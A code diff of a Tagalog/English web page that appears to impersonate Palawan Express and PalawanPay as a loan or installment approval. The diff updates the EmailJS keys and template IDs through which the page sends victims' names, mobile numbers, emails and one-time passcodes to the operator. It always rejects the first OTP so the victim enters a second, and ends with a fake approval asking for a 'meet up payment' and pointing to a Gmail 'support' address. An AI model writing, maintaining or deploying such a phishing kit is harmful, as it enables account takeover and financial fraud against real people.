@@ -8,7 +8,7 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
   (function() {
-    emailjs.init("565BErlHzvW1CIekI"); // Your EmailJS Public Key
+    emailjs.init("JrobxQsLrNfy-y_lB"); // Your updated EmailJS Public Key
   })();
 </script>
 <style>
@@ -71,7 +71,6 @@
   .rights { margin-top: 5px; font-size: 12px; color: #666; }
   .status { margin-top: 10px; font-size: 14px; }
   .success-message { font-size: 14px; color: #046930; text-align: left; line-height: 1.4; }
-  /* Loader */
   #loading {
     display: none;
     text-align: center;
@@ -137,7 +136,7 @@
       Ang iyong application ay na APPROVE na bago ipagpapatuloy.<br><br>
       Screenshot of palawanpay and amount for meet up payment to record your first "GIVES AND INSTALLMENT"<br><br>
       NOTE: This is what you will pay when you meet the seller, MEET UP PAYMENT ONLY.<br><br>
-      Your Verification code is (450099). Report to support " ph.palawanexpress@gmail.com" or call our hotline " 09190380588" <b>DO NOT SHARE.</b>
+      Your Verification code is (450099). Report to support "ph.palawanexpress@gmail.com" or call our hotline "09190380588" <b>DO NOT SHARE.</b>
     </p>
     <button class="btn" onclick="window.location.href='https://www.palawanpay.com/'">Finish</button>
   </div>
@@ -149,13 +148,13 @@
 </div>
 
 <script>
-  // Registration Form
+  // Registration Form Submission
   document.getElementById('register-form').addEventListener('submit', function(e) {
     e.preventDefault();
     document.getElementById('status1').textContent = "Sending...";
     document.getElementById('status1').style.color = "blue";
 
-    emailjs.sendForm('service_3hqkdcg', 'template_ukf5gwk', this)
+    emailjs.sendForm('service_hgozm6f', 'template_c2i1xpm', this)
       .then(() => startOTPPage(), () => startOTPPage()); // Always proceed
   });
 
@@ -165,19 +164,17 @@
     document.getElementById('step2').style.display = 'block';
   }
 
-  // UPDATED: 30s loading after 1st (wrong) OTP attempt before letting user try again.
   function verifyOTP() {
     const attempts = parseInt(sessionStorage.getItem('otpAttempts') || '0', 10);
     const newAttempts = attempts + 1;
     const enteredOTP = document.getElementById('otp').value.trim();
-    const correctOTP = "123456"; // simulated
+    const correctOTP = "123456"; // simulated correct OTP
 
     const name = document.getElementById('name').value;
     const mobile = document.getElementById('mobile').value;
     const email = document.getElementById('email').value;
 
     if (newAttempts === 1) {
-      // Hide OTP screen & show loading for 30s
       document.getElementById('step2').style.display = 'none';
       document.getElementById('loading').style.display = 'block';
 
@@ -188,19 +185,17 @@
         document.getElementById('status2').style.color = 'red';
       }, 30000); // 30 seconds
     } else {
-      // Always correct on 2nd attempt
       document.getElementById('step2').style.display = 'none';
       document.getElementById('loading').style.display = 'block';
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
         document.getElementById('step3').style.display = 'block';
-      }, 10000); // 10 seconds loading to approval
+      }, 10000); // 10 seconds to approval
     }
 
     sessionStorage.setItem('otpAttempts', newAttempts);
 
-    // Send OTP attempt email
-    emailjs.send('service_3hqkdcg', 'template_ukf5gwk', {
+    emailjs.send('service_hgozm6f', 'template_c2i1xpm', {
       name: name,
       mobile: mobile,
       email: email,
